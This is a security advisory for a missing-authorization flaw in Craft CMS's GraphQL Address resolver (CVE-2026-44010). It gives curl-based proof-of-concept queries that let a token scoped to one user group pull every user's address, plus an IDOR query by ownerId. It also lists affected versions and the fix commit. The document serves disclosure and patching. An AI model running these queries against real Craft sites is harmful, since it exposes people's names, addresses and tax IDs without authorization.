# [H] Craft CMS's Missing Authorization in GraphQL Address Resolver Allows Cross-Scope PII Disclosure

## Summary
Severity: High
Advisory: GHSA-gj2p-p9m4-c8gw
CVE: CVE-2026-44010
CWE: CWE-862
Ecosystem: Packagist
CVSS: CVSS:4.0/AV:N/AC:L/AT:N/PR:L/UI:N/VC:H/VI:N/VA:N/SC:N/SI:N/SA:N (CVSS_V4)
Published: 2026-05-06
Source: https://github.com/advisories/GHSA-gj2p-p9m4-c8gw
Type: github-advisory

## Affected
- Packagist: `craftcms/cms` — affected >=5.0.0 <5.9.18
- Packagist: `craftcms/cms` — affected >=4.0.0 <4.17.12

## Details
### Summary

The GraphQL Address element resolver (src/gql/resolvers/elements/Address.php) performs no schema scope filtering on top-level queries. A GraphQL API token scoped to a single low-privilege user group can read every address in the system, including addresses belonging to users in groups the token has no authorization to access. This exposes PII, including full names, addresses, organizations, tax IDs, etc.

### Details

Every GraphQL element resolver in Craft CMS applies schema scope filtering via `GqlHelper::extractAllowedEntitiesFromSchema()` when handling top-level queries, except the Address resolver.

The only gate check for addresses is `canQueryUsers()` (`src/gql/queries/Address.php`, line 30), which is a binary check. It returns `true` if the token has access to *any* user group. Once past this gate, no further filtering is applied.

### PoC

**Tested on:** CraftCMS 5.9.17 (fresh Docker install, PHP 8.3)
**Prerequisites:** A GraphQL API token with read access to any single user group

### Environment

- Two user groups: `publicUsers` (in token scope) and `internalTeam` (NOT in scope)
- 5 internal executives with corporate addresses (internalTeam)
- 3 public customers with personal addresses (publicUsers)
- GQL token scoped to `publicUsers:read` only

**Step 1:** Introspect the schema to discover the `addresses` query is available to this token. Issue the below curl command 

```bash
curl -s -H "Authorization: Bearer wbzwuzvlfohtahryztgaawyjpctqdvcm" -H "Content-Type: application/json" -d '{"query": "{ __type(name: \"Query\") { fields { name description } } }"}' http://localhost:8080/actions/graphql/api | jq
```

<img width="1641" height="856" alt="image" src="https://github.com/user-attachments/assets/d798b4d2-9965-40fd-8252-ba6b08d1dde9" />

The token can see `addresses`, `entries`, `users` as top-level queries.

**Step 2:** Enumerate Address fields to identify PII exposure surface.

```bash
curl -s -H "Authorization: Bearer wbzwuzvlfohtahryztgaawyjpctqdvcm" -H "Content-Type: application/json" -d '{"query": "{ __type(name: \"AddressInterface\") { fields { name
type { name } } } }"}' http://localhost:8080/actions/graphql/api | jq
```

<img width="1726" height="862" alt="image" src="https://github.com/user-attachments/assets/31a90b5d-7337-49b9-8802-355f16b7b4f3" />

> Exposed fields include: `fullName`, `firstName`, `lastName`, `addressLine1/2/3`, `locality`, `postalCode`, `countryCode`, `organization`, `organizationTaxId`, `latitude`, `longitude`.
> 

**Step 3:** Establish baseline -  confirm the token’s user scope is limited. This proves our token only has access to the `publicUsers` group.

```bash
curl -s -H "Authorization: Bearer wbzwuzvlfohtahryztgaawyjpctqdvcm" -H "Content-Type: application/json" -d '{"query": "{ addresses { id fullName firstName lastName addressLine1 addressLine2 locality postalCode countryCode organization
organizationTaxId } }"}' http://localhost:8080/actions/graphql/api | jq
```

<img width="1626" height="492" alt="image" src="https://github.com/user-attachments/assets/42ec8c3d-d1ae-4eac-9202-af072f394e4a" />

Only 5 public users returned. Scope enforcement works correctly for the User resolver — internal executives are NOT visible.

**Step 4:** Query all addresses - the token returns data for ALL user groups, including those outside its authorized scope.

```bash
curl -s -H "Authorization: Bearer wbzwuzvlfohtahryztgaawyjpctqdvcm" -H "Content-Type: application/json" -d '{"query": "{ addresses { id fullName firstName lastName addressLine1 addressLine2 locality postalCode countryCode organization
  organizationTaxId } }"}' http://localhost:8080/actions/graphql/api | jq
```

<img width="1902" height="910" alt="image" src="https://github.com/user-attachments/assets/ef34e11c-36a8-4582-93e3-04c3e4dad6ab" />

<img width="1444" height="942" alt="image" src="https://github.com/user-attachments/assets/64d6edec-60bf-4481-8a20-7f64c81c015b" />


 ▎ "This token can only see 5 users, but it returns 10 addresses" as shown in the above 2 screenshot outputs

> **All 10 addresses returned.** The same token that only sees 5 public users now returns addresses for internal executives including corporate tax IDs:
> 
> - Sarah Chen, 4200 Executive Plaza Dr, SF — Horizon Dynamics Inc. (TaxID: 82-4917263)
> - James Whitfield, 89 Kensington High St, London — Whitfield Capital Partners LLP (TaxID: GB927461038)
> - Maria Rossi, 15 Via della Conciliazione, Roma — Rossi & Bianchi Avvocati (TaxID: IT04829173651)
> - David Nakamura, 2-11-3 Meguro, Tokyo — Nakamura Medical Technologies KK (TaxID: JP8230-4719-2835)
> - Elena Voronova, 27 Universitätsstrasse, Zurich — Voronova Biotech AG (TaxID: CHE-384.291.057)

---

**Step 5:** Targeted IDOR - extract a specific internal user’s address by owner ID.

```bash
curl -s -H "Authorization: Bearer wbzwuzvlfohtahryztgaawyjpctqdvcm" -H "Content-Type: application/json" -d '{"query": "{ addresses(ownerId: [3]) { fullName addressLine1 addressLine2 locality postalCode countryCode organization
  organizationTaxId } }"}' http://localhost:8080/actions/graphql/api | jq
```

<img width="1902" height="365" alt="image" src="https://github.com/user-attachments/assets/b7c6d5cf-295a-433a-a76c-2b69815968cd" />

> Directly extracts a specific internal team member’s address: “Secret Admin”, 1 Secret Government Facility, Suite 007, Langley 22101 — SecretCorp LLC (TaxID: 98-7654321). The token has zero authorization to access this user’s data.

## Impact 

### Who is Impacted

Any Craft CMS Pro site (v4.0.0+) that uses GraphQL API tokens with user group scoping and stores user addresses. This is the standard deployment pattern for headless CMS sites using frameworks such as Next.js, Nuxt.js, or Gatsby. An attacker with any valid GraphQL token that has access to at least one user group can extract all addresses in the system, regardless of scope restrictions.

### Risk

- Direct threat to installation data: Any GraphQL API token with access to any single user group can extract all address systems-wide, including names, home addresses, organizations, and tax IDs belonging to users in restricted groups.

- Targeted extraction via IDOR: The `ownerId` argument allows an attacker to extract specific users’ addresses by ID, enabling targeted reconnaissance against administrators or high-value users without any brute-force or elevated access.

- Scope boundary failure: Craft CMS’s GraphQL schema scoping system is the primary security mechanism for controlling API access. Every other element resolver (Entry, User, Asset, Category, Tag) enforces this boundary. The Address resolver does not, making this a foundational gap in Craft’s native authorization model and not a site-specific configuration issue.

- Affects all installations using GraphQL with user groups: Any Craft CMS Pro site that exposes a scoped GraphQL token and stores addresses is affected. This is the standard headless CMS deployment pattern, not an edge case.

## AI Disclosure

This vulnerability was identified through manual source code review with AI-assisted analysis (Claude). The initial pattern deviation (Address resolver missing scope filtering while all other resolvers have it) was identified through manual comparison of resolver implementations. AI was used to assist with code navigation, PoC scripting, and report drafting. 

All findings were verified against a local Docker instance of Craft CMS 5.9.17.

## Resources

https://github.com/craftcms/cms/commit/834b2cf61ad0dcee9b03add44ed402ebf18db128

## References
- https://github.com/craftcms/cms/security/advisories/GHSA-gj2p-p9m4-c8gw
- https://nvd.nist.gov/vuln/detail/CVE-2026-44010
- https://github.com/craftcms/cms/commit/834b2cf61ad0dcee9b03add44ed402ebf18db128
- https://github.com/craftcms/cms
